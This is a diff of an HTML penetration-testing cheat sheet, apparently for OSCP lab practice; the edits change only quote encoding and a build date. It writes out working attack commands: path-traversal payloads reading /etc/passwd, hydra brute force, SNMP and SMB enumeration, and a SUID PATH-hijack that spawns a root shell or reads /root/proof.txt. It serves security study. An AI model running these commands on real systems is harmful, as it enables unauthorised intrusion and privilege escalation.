-nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span>.168.245.0/24<span class="w"> </span>-oG<span class="w"> </span>-<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>up<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">&#39;{print $2}&#39;</span>
+nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span>.168.245.0/24<span class="w"> </span>-oG<span class="w"> </span>-<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>up<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $2}'</span>
 </pre></div>
 <hr />
 <h3>SNMP</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## find the community string</span>
 <span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>public<span class="w"> </span>private<span class="w"> </span>manager<span class="w"> </span>internal<span class="p">;</span><span class="w"> </span><span class="k">do</span>
-<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;== </span><span class="nv">$c</span><span class="s2">&quot;</span><span class="p">;</span><span class="w"> </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$c</span><span class="s2">&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"== </span><span class="nv">$c</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">"</span><span class="nv">$c</span><span class="s2">"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
 <span class="k">done</span>
 
 <span class="c1">## full walk to a file, then grep it</span>
@@ -2157,7 +2157,7 @@ snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </
 snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.4.20.1.1<span class="w">      </span><span class="c1"># interface IPs</span>
 
 <span class="c1">## decode an nsExtendTable index suffix (5.82.69.83.69.84 -&gt; RESET)</span>
-python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;s=&#39;82.69.83.69.84&#39;.split(&#39;.&#39;); print(&#39;&#39;.join(chr(int(x)) for x in s[1:]))&quot;</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">"s='82.69.83.69.84'.split('.'); print(''.join(chr(int(x)) for x in s[1:]))"</span>
 
 <span class="c1">## bulk walk when v1 is slow</span>
 snmpbulkwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2
@@ -2165,27 +2165,27 @@ snmpbulkwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w
 <hr />
 <h3>Web</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
-curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;%{http_code} %{size_download}\n&quot;</span><span class="w"> </span>http://<span class="nv">$T</span>/robots.txt
+curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">"%{http_code} %{size_download}\n"</span><span class="w"> </span>http://<span class="nv">$T</span>/robots.txt
 
 <span class="c1">## path traversal tests — --path-as-is is mandatory or curl normalises the payload</span>
-curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://</span><span class="nv">$T</span><span class="s2">/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd&quot;</span>
-curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://</span><span class="nv">$T</span><span class="s2">/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd&quot;</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">"http://</span><span class="nv">$T</span><span class="s2">/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">"http://</span><span class="nv">$T</span><span class="s2">/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"</span>
 
 feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>--smart<span class="w"> </span>--no-state<span class="w"> </span>-q
 
-ffuf<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: FUZZ&quot;</span><span class="w"> </span><span class="se">\</span>
+ffuf<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span>-H<span class="w"> </span><span class="s2">"Host: FUZZ"</span><span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt<span class="w"> </span><span class="se">\</span>
-<span class="w">  </span>-mc<span class="w"> </span>all<span class="w"> </span>-fr<span class="w"> </span><span class="s2">&quot;Apache2 Ubuntu Default Page&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-s
+<span class="w">  </span>-mc<span class="w"> </span>all<span class="w"> </span>-fr<span class="w"> </span><span class="s2">"Apache2 Ubuntu Default Page"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-s
 </pre></div>
 <hr />
 <h3>FTP</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$&#39;user anonymous anon@test\nls\nbye&#39;</span><span class="w">    </span><span class="c1"># 530 right after USER =&gt; anonymous off</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$'user anonymous anon@test\nls\nbye'</span><span class="w">    </span><span class="c1"># 530 right after USER =&gt; anonymous off</span>
 
 hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-f<span class="w"> </span>-V<span class="w"> </span>ftp://<span class="nv">$T</span><span class="w">       </span><span class="c1"># -t 4 keeps vsftpd happy</span>
 
-curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span><span class="s2">&quot;ftp://</span><span class="nv">$T</span><span class="s2">/&quot;</span><span class="w">                         </span><span class="c1"># list</span>
-curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span>-o<span class="w"> </span>file<span class="w"> </span><span class="s2">&quot;ftp://</span><span class="nv">$T</span><span class="s2">/file&quot;</span><span class="w">             </span>#<span class="w"> </span>download
+curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span><span class="s2">"ftp://</span><span class="nv">$T</span><span class="s2">/"</span><span class="w">                         </span><span class="c1"># list</span>
+curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span>-o<span class="w"> </span>file<span class="w"> </span><span class="s2">"ftp://</span><span class="nv">$T</span><span class="s2">/file"</span><span class="w">             </span>#<span class="w"> </span>download
 </pre></div>
 <hr />
 <h3>SSH</h3>
@@ -2194,29 +2194,29 @@ curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>
 <span class="c1">## BatchMode=yes so it never hangs on a password prompt</span>
 ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>-o<span class="w"> </span><span class="nv">BatchMode</span><span class="o">=</span>yes<span class="w"> </span>-o<span class="w"> </span><span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span>id
 
-sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>ssh<span class="w"> </span>-o<span class="w"> </span><span class="nv">PreferredAuthentications</span><span class="o">=</span>password<span class="w"> </span><span class="se">\</span>
+sshpass<span class="w"> </span>-p<span class="w"> </span><span class="s1">'pass'</span><span class="w"> </span>ssh<span class="w"> </span>-o<span class="w"> </span><span class="nv">PreferredAuthentications</span><span class="o">=</span>password<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-o<span class="w"> </span><span class="nv">PubkeyAuthentication</span><span class="o">=</span>no<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span>id
 
 <span class="c1">## run a whole enumeration script in one connection</span>
-ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span><span class="s1">&#39;bash -s&#39;</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
+ssh<span class="w"> </span>-i<span class="w"> </span>id_rsa<span class="w"> </span>user@<span class="nv">$T</span><span class="w"> </span><span class="s1">'bash -s'</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
 </pre></div>
 <hr />
 <h3>SMB</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
-nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
-nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">''</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$T</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span><span class="s1">'pass'</span><span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
 
-smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN/user%pass&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;recurse; ls&#39;</span>
-smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;DOMAIN/user%pass&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;get file.txt&#39;</span>
+smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">'DOMAIN/user%pass'</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">'recurse; ls'</span>
+smbclient<span class="w"> </span>//<span class="nv">$T</span>/share<span class="w"> </span>-U<span class="w"> </span><span class="s1">'DOMAIN/user%pass'</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">'get file.txt'</span>
 </pre></div>
 <hr />
 <h3>Linux local enumeration</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>id<span class="p">;</span><span class="w"> </span>hostname<span class="p">;</span><span class="w"> </span>sudo<span class="w"> </span>-n<span class="w"> </span>-l<span class="p">;</span><span class="w"> </span>uname<span class="w"> </span>-a
 
 <span class="c1">## SUID without tripling the output on snap</span>
-find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^/snap&#39;</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^/snap'</span>
 
-find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">&#39;^/snap&#39;</span><span class="w">    </span><span class="c1"># setgid</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-2000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^/snap'</span><span class="w">    </span><span class="c1"># setgid</span>
 getcap<span class="w"> </span>-r<span class="w"> </span>/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
 cat<span class="w"> </span>/etc/crontab<span class="p">;</span><span class="w"> </span>ls<span class="w"> </span>-la<span class="w"> </span>/etc/cron.*
 ss<span class="w"> </span>-tlnp
@@ -2225,10 +2225,10 @@ find<span class="w"> </span>/<span class="w"> </span>-name<span class="w"> </spa
 </pre></div>
 <hr />
 <h3>Binary analysis</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>bin<span class="w">                                  </span><span class="c1"># &quot;not stripped&quot; = function names survive</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>bin<span class="w">                                  </span><span class="c1"># "not stripped" = function names survive</span>
 strings<span class="w"> </span>-a<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40<span class="w">                 </span><span class="c1"># system / popen / exec / bare command names</span>
-objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">&#39;/&lt;main&gt;:/,/^$/p&#39;</span>
-readelf<span class="w"> </span>-d<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;BIND_NOW|FLAGS&#39;</span><span class="w"> </span><span class="c1"># full RELRO =&gt; forget GOT overwrite</span>
+objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">'/&lt;main&gt;:/,/^$/p'</span>
+readelf<span class="w"> </span>-d<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">'BIND_NOW|FLAGS'</span><span class="w"> </span><span class="c1"># full RELRO =&gt; forget GOT overwrite</span>
 objdump<span class="w"> </span>-s<span class="w"> </span>-j<span class="w"> </span>.rodata<span class="w"> </span>bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w">          </span>#<span class="w"> </span>resolve<span class="w"> </span>the<span class="w"> </span>strings<span class="w"> </span>passed<span class="w"> </span>to<span class="w"> </span>system<span class="o">()</span>
 </pre></div>
 <p>Reconstructing source from a small binary:</p>
@@ -2238,37 +2238,37 @@ objdump<span class="w"> </span>-s<span class="w"> </span>-j<span class="w"> </sp
 <hr />
 <h3>Privesc — PATH hijack template</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/x.XXXXXX<span class="k">)</span>
-cat<span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span><span class="w"> </span><span class="s">&lt;&lt;&#39;EOF&#39;</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span><span class="w"> </span><span class="s">&lt;&lt;'EOF'</span>
 <span class="s">#!/bin/bash</span>
 <span class="s">id &gt; /tmp/root_id.txt</span>
 <span class="s">cat /root/proof.txt &gt; /tmp/root_proof.txt 2&gt;&amp;1</span>
 <span class="s">chmod 644 /tmp/root_id.txt /tmp/root_proof.txt</span>
 <span class="s">EOF</span>
-chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
 
 <span class="c1">## name the faked binary exactly as the SUID program invokes it</span>
-<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>/path/to/suid_binary
 
 cat<span class="w"> </span>/tmp/root_id.txt
 </pre></div>
 <p>Works only when the SUID binary calls <code>setuid(0)</code>/<code>seteuid(0)</code> <strong>before</strong> <code>system()</code>. If it does
 not, the shell drops privileges and the payload runs as you. Check the disassembly order first.</p>
 <p>Interactive variant:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash\n/bin/bash -p\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span><span class="p">;</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
-<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">printf</span><span class="w"> </span><span class="s1">'#!/bin/bash\n/bin/bash -p\n'</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span><span class="p">;</span><span class="w"> </span>chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>/path/to/suid_binary
 </pre></div>
 <hr />
 <h3>Cleanup</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="w"> </span>/tmp/c.XXXXXX<span class="k">)</span>
-<span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash\nrm -f /tmp/root_id.txt /tmp/root_proof.txt; rm -rf /tmp/x.*\n&#39;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
-chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">/chpasswd&quot;</span>
-<span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">&quot;</span><span class="w"> </span>/path/to/suid_binary
-ls<span class="w"> </span>-la<span class="w"> </span>/tmp/root_id.txt<span class="w">        </span>#<span class="w"> </span>must<span class="w"> </span>be<span class="w"> </span><span class="s2">&quot;No such file or directory&quot;</span>
+<span class="nb">printf</span><span class="w"> </span><span class="s1">'#!/bin/bash\nrm -f /tmp/root_id.txt /tmp/root_proof.txt; rm -rf /tmp/x.*\n'</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
+chmod<span class="w"> </span>+x<span class="w"> </span><span class="s2">"</span><span class="nv">$D</span><span class="s2">/chpasswd"</span>
+<span class="nv">PATH</span><span class="o">=</span><span class="s2">"</span><span class="nv">$D</span><span class="s2">:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>/path/to/suid_binary
+ls<span class="w"> </span>-la<span class="w"> </span>/tmp/root_id.txt<span class="w">        </span>#<span class="w"> </span>must<span class="w"> </span>be<span class="w"> </span><span class="s2">"No such file or directory"</span>
 </pre></div></div></section>
 
     <footer>
       <span>Authorised lab environment · flags and credentials are lab-specific</span>
-      <span><a href="https://github.com/AV10V/OSCP">source on GitHub</a> · built 23 November 2026</span>
+      <span><a href="https://github.com/AV10V/OSCP">source on GitHub</a> · built 24 November 2026</span>
     </footer>
   </main>
 </div>
